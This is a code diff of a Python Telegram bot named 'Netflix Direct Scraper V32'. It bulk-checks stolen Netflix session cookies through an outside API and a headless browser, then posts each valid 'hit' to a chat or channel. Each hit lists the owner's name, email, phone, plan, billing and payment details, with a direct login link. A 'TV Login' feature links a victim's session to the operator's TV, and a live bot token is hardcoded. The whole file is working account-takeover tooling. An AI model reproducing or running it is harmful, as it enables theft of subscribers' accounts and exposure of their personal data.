@@ -18,7 +18,7 @@ from datetime import datetime, timedelta
 import urllib3
 from flask import Flask
 
-# Build Error Suppressor for Railway
+# Suppress Warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
@@ -28,9 +28,7 @@ BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
 ADMIN_ID = 6176299339
 CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
 USERS_FILE = "users.txt"
-
-# Prevention for Railway Memory Crash
-SCREENSHOT_SEMAPHORE = threading.Semaphore(2) 
+SCREENSHOT_SEMAPHORE = threading.Semaphore(20) 
 
 app = Flask(__name__)
 
@@ -109,12 +107,10 @@ def parse_smart_cookie(c_in):
                 if c.get('name') == 'NetflixId': return urllib.parse.unquote(c.get('value'))
         except: pass
     match = re.search(r"NetflixId=([^;]+)", c_in)
-    if match: return urllib.parse.unquote(match.group(1))
-    return c_in if len(c_in) > 30 else None
+    return urllib.parse.unquote(match.group(1)) if match else c_in
 
 def check_cookie(c_in):
     nid = parse_smart_cookie(c_in)
-    if not nid: return {"valid": False}
     api_res = call_api("gen", {"netflix_id": nid})
     if not api_res or not api_res.get("success"): return {"valid": False}
     
@@ -138,132 +134,130 @@ def check_cookie(c_in):
                     browser.close()
             finally: SCREENSHOT_SEMAPHORE.release()
             
-        return {"valid": True, "country": deep_data["country"], "link": api_res.get("login_url"), "data": deep_data, "screenshot": screenshot_bytes, "full_cookie": c_in}
-    except: return {"valid": True, "link": api_res.get("login_url"), "data": {"email": api_res.get("email", "N/A"), "status": "Active"}, "screenshot": None, "full_cookie": c_in}
+        return {"valid": True, "country": deep_data["country"], "link": api_res.get("login_url"), "data": deep_data, "screenshot": screenshot_bytes}
+    except: return {"valid": True, "link": api_res.get("login_url"), "data": {"email": api_res.get("email", "N/A"), "status": "Active"}, "screenshot": None}
 
-def main():
-    keep_alive()
-    bot = telebot.TeleBot(BOT_TOKEN)
+bot = telebot.TeleBot(BOT_TOKEN)
 
-    @bot.message_handler(commands=['start'])
-    def start(message):
-        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
-        kb.add("📩 Send Here (DM)", "📡 Send to Channel")
-        kb.add("📺 TV Login", "🛑 Stop System")
-        msg = ("**🔥 Netflix Direct Scraper V32**\n\n👋 **Welcome!** RESTORED:\n"
-               "1️⃣ Select Mode.\n2️⃣ Send Cookie (Text/File).\n\n🍪 Format: `NetflixId=v2...` or JSON\n👇 **Select Mode:**")
-        bot.send_message(message.chat.id, msg, reply_markup=kb, parse_mode='Markdown')
+@bot.message_handler(commands=['start'])
+def start(message):
+    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    kb.add("📩 Send Here (DM)", "📡 Send to Channel")
+    kb.add("📺 TV Login", "🛑 Stop System")
+    msg = ("**🔥 Netflix Direct Scraper V32**\n\n👋 **Welcome!** Choose mode below to begin.")
+    bot.send_message(message.chat.id, msg, reply_markup=kb, parse_mode='Markdown')
 
-    @bot.message_handler(func=lambda m: m.text in ["📩 Send Here (DM)", "📡 Send to Channel", "🛑 Stop System"])
-    def set_mode(message):
-        uid = message.chat.id
-        if message.text == "📩 Send Here (DM)":
-            user_modes[uid] = {'target': uid, 'stop': False}
-            bot.reply_to(message, "✅ **DM Mode Active.** Send cookies now.")
-        elif message.text == "📡 Send to Channel":
-            msg = bot.reply_to(message, "📡 **Enter Channel ID (e.g. -100xxx):**")
-            bot.register_next_step_handler(msg, ch_verify)
-        elif message.text == "🛑 Stop System":
-            if uid in user_modes: user_modes[uid]['stop'] = True
-            bot.reply_to(message, "🛑 **Scanning Stopped.**")
+@bot.message_handler(func=lambda m: m.text in ["📩 Send Here (DM)", "📡 Send to Channel", "🛑 Stop System"])
+def handle_mode(message):
+    uid = message.chat.id
+    if message.text == "📩 Send Here (DM)":
+        user_modes[uid] = {'target': uid, 'stop': False}
+        bot.reply_to(message, "✅ **DM Mode Active.** Send cookies/file now.")
+    elif message.text == "📡 Send to Channel":
+        msg = bot.reply_to(message, "📡 **Enter Channel ID (e.g. -100xxx):**")
+        bot.register_next_step_handler(msg, ch_verify)
+    elif message.text == "🛑 Stop System":
+        if uid in user_modes: user_modes[uid]['stop'] = True
+        bot.reply_to(message, "🛑 **Scanning Stopped.**")
 
-    def ch_verify(message):
-        try:
-            cid = int(message.text.strip())
-            chat = bot.get_chat(cid)
-            markup = types.InlineKeyboardMarkup()
-            markup.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"set_{cid}"))
-            bot.reply_to(message, f"📡 **Channel:** {chat.title}\nConfirm?", reply_markup=markup)
-        except: bot.reply_to(message, "❌ Invalid ID or Not Admin.")
+def ch_verify(message):
+    try:
+        cid = int(message.text.strip())
+        chat = bot.get_chat(cid)
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"set_{cid}"))
+        bot.reply_to(message, f"📡 **Channel:** {chat.title}\nConfirm?", reply_markup=markup)
+    except: bot.reply_to(message, "❌ Invalid ID or Not Admin.")
 
-    @bot.callback_query_handler(func=lambda call: call.data.startswith("set_"))
-    def ch_callback(call):
-        cid = int(call.data.split("_")[1])
-        user_modes[call.message.chat.id] = {'target': cid, 'stop': False}
-        bot.edit_message_text(f"✅ **Target Locked to {cid}**", call.message.chat.id, call.message.message_id)
+@bot.callback_query_handler(func=lambda call: call.data.startswith("set_"))
+def ch_callback(call):
+    cid = int(call.data.split("_")[1])
+    user_modes[call.message.chat.id] = {'target': cid, 'stop': False}
+    bot.edit_message_text(f"✅ **Target Locked!**", call.message.chat.id, call.message.message_id)
 
-    @bot.message_handler(func=lambda m: m.text == "📺 TV Login")
-    def tv_start(message):
-        msg = bot.reply_to(message, "📺 **Send Netflix Cookie (Text).**")
-        bot.register_next_step_handler(msg, tv_process)
+@bot.message_handler(func=lambda m: m.text == "📺 TV Login")
+def tv_login(message):
+    msg = bot.reply_to(message, "📺 **Send Netflix Cookie (Text only).**")
+    bot.register_next_step_handler(msg, tv_process)
 
-    def tv_process(message):
-        res = check_cookie(message.text)
-        if not res.get("valid"): return bot.reply_to(message, "❌ **Dead Cookie.**")
-        bot.reply_to(message, f"✅ **Valid!**\n📧 Email: {res['data']['email']}\n\nEnter **8-Digit TV Code**.")
-        bot.register_next_step_handler(message, lambda m: tv_execute(m, parse_smart_cookie(message.text)))
+def tv_process(message):
+    res = check_cookie(message.text)
+    if not res.get("valid"): return bot.reply_to(message, "❌ **Dead Cookie.**")
+    bot.reply_to(message, f"✅ **Valid!** e: {res['data']['email']}\n\nEnter **8-Digit TV Code**.")
+    bot.register_next_step_handler(message, lambda m: tv_execute(m, parse_smart_cookie(message.text)))
 
-    def tv_execute(message, nid):
-        api_res = call_api("tvlogin", {"netflix_id": nid, "tv_code": message.text.strip()})
-        bot.reply_to(message, f"📺 **Result:** {api_res.get('message', 'Error')}")
+def tv_execute(message, nid):
+    api_res = call_api("tvlogin", {"netflix_id": nid, "tv_code": message.text.strip()})
+    bot.reply_to(message, f"📺 **Result:** {api_res.get('message', 'Error')}")
 
-    @bot.message_handler(content_types=['document', 'text'])
-    def handle_input(message):
-        uid = message.chat.id
-        if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
-        mode = user_modes.get(uid)
-        if not mode: return bot.reply_to(message, "❌ **Select mode first!**")
+@bot.message_handler(content_types=['document', 'text'])
+def handle_bulk(message):
+    uid = message.chat.id
+    if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
+    mode = user_modes.get(uid)
+    if not mode: return bot.reply_to(message, "❌ **Select Mode first!**")
+    
+    cookies = []
+    if message.content_type == 'document':
+        file = bot.get_file(message.document.file_id)
+        raw = bot.download_file(file.file_path).decode('utf-8', errors='ignore')
+        cookies = [l.strip() for l in raw.splitlines() if len(l.strip()) > 30]
+    else: cookies = [l.strip() for l in message.text.splitlines() if len(l.strip()) > 30]
+
+    if not cookies: return bot.reply_to(message, "❌ **No Cookies found.**")
+    status_msg = bot.reply_to(message, "⏳ **Checking...**")
+    
+    def background_task():
+        total = len(cookies)
+        hits = 0
+        for i, c in enumerate(cookies, 1):
+            if mode.get('stop'): break
+            prog = int((i/total)*10)
+            bar = "■"*prog + "□"*(10-prog)
+            try: bot.edit_message_text(f"🚀 **Checking:** [{bar}] {int((i/total)*100)}%\nChecked: {i}/{total} | Hits: {hits}", uid, status_msg.message_id)
+            except: pass
+            
+            res = check_cookie(c)
+            if res.get("valid"):
+                hits += 1
+                send_hit(mode['target'], res)
         
-        cookies = []
-        if message.content_type == 'document':
-            file_info = bot.get_file(message.document.file_id)
-            raw = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
-            cookies = [l.strip() for l in raw.splitlines() if len(l.strip()) > 30]
-        else:
-            cookies = [l.strip() for l in message.text.splitlines() if len(l.strip()) > 30]
+        bot.delete_message(uid, status_msg.message_id)
+        bot.send_message(uid, f"✅ **Complete!** Found {hits} Hits.")
 
-        if not cookies: return bot.reply_to(message, "❌ **No Cookies found.**")
-        status_msg = bot.reply_to(message, "⏳ **Checking...**")
-        
-        def background_check():
-            total = len(cookies)
-            hits = 0
-            for i, c in enumerate(cookies, 1):
-                if mode.get('stop'): break
-                try:
-                    prog = int((i/total)*10)
-                    bar = "■"*prog + "□"*(10-prog)
-                    bot.edit_message_text(f"🚀 **Checking:** [{bar}] {int((i/total)*100)}%\nChecked: {i}/{total} | Hits: {hits}", uid, status_msg.message_id)
-                except: pass
-                
-                res = check_cookie(c)
-                if res.get("valid"):
-                    hits += 1
-                    send_hit(bot, mode['target'], res)
-            bot.send_message(uid, f"✅ **Complete!** Found {hits} Hits.")
+    threading.Thread(target=background_task).start()
 
-        threading.Thread(target=background_check).start()
-
-    def send_hit(bot_obj, target, res):
-        data = res['data']
-        def esc(t): return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
-        
-        msg = (f"🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟\n\n"
-               f"🟢 **STATUS:** Active ✅\n"
-               f"🌍 **REGION:** {esc(res['country'])} {get_flag(res['country'])}\n"
-               f"⏰ **MEMBER SINCE:** {esc(data['member_since'])} {esc(data['member_duration'])}\n"
-               f"👤 **OWNER:** {esc(data['name'])}\n"
-               f"👑 **PLAN:** {esc(data['plan'])}\n"
-               f"📺 **QUALITY:** {esc(data['quality'])}\n"
-               f"💰 **PRICE:** {esc(data['price'])}\n"
-               f"📅 **BILLING:** {esc(data['expiry'])}\n"
-               f"🎭 **PROFILES:** {', '.join(data['profiles'])}\n"
-               f"📧 **EMAIL:** {esc(data['email'])}\n"
-               f"☎️ **PHONE:** {esc(data['phone'])}\n\n"
-               f"💜 [CLICK TO LOGIN]({res['link']}) 💜\n\n"
-               f"📋 **COOKIE (TAP TO COPY):**\n<code>{esc(res['full_cookie'])}</code>\n"
-               f"━━━━━━━━━━━━━━━━━━━━━━\n"
-               f"👨‍💻 @F88UF | 📢 @F88UF9844")
-        try:
-            if res['screenshot']:
-                bot_obj.send_photo(target, io.BytesIO(res['screenshot']), caption=msg, parse_mode='HTML')
-            else: bot_obj.send_message(target, msg, parse_mode='HTML')
-        except: bot_obj.send_message(target, msg, parse_mode='HTML')
-
-    while True:
-        try: bot.infinity_polling(timeout=90, long_polling_timeout=60, skip_pending=True)
-        except: time.sleep(5)
+def send_hit(target, res):
+    data = res['data']
+    def esc(t): return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
+    
+    lines = []
+    lines.append("🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟")
+    lines.append("")
+    lines.append(f"🟢 **STATUS:** Active ✅")
+    lines.append(f"🌍 **REGION:** {esc(res['country'])} {get_flag(res['country'])}")
+    lines.append(f"⏰ **MEMBER SINCE:** {esc(data['member_since'])} {esc(data['member_duration'])}")
+    lines.append(f"👤 **OWNER:** {esc(data['name'])}")
+    lines.append(f"👑 **PLAN:** {esc(data['plan'])}")
+    lines.append(f"📺 **QUALITY:** {esc(data['quality'])}")
+    lines.append(f"💰 **PRICE:** {esc(data['price'])}")
+    lines.append(f"💳 **PAYMENT:** {esc(data['payment'])}")
+    lines.append(f"📅 **BILLING:** {esc(data['expiry'])}")
+    lines.append(f"🎭 **PROFILES:** {', '.join(data['profiles'])}")
+    lines.append(f"📧 **EMAIL:** {esc(data['email'])}")
+    lines.append(f"☎️ **PHONE:** {esc(data['phone'])}")
+    lines.append("")
+    lines.append(f"💜 [CLICK HERE TO LOGIN]({res['link']}) 💜")
+    lines.append("")
+    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
+    lines.append("👨‍💻 **Admin:** @F88UF | 📢 **Channel:** @F88UF9844")
+    
+    msg = "\n".join(lines)
+    if res['screenshot']:
+        bot.send_photo(target, io.BytesIO(res['screenshot']), caption=msg, parse_mode='HTML')
+    else: bot.send_message(target, msg, parse_mode='HTML')
 
 if __name__ == "__main__":
-    main()
-            
+    keep_alive()
+    bot.infinity_polling(skip_pending=True)
+    
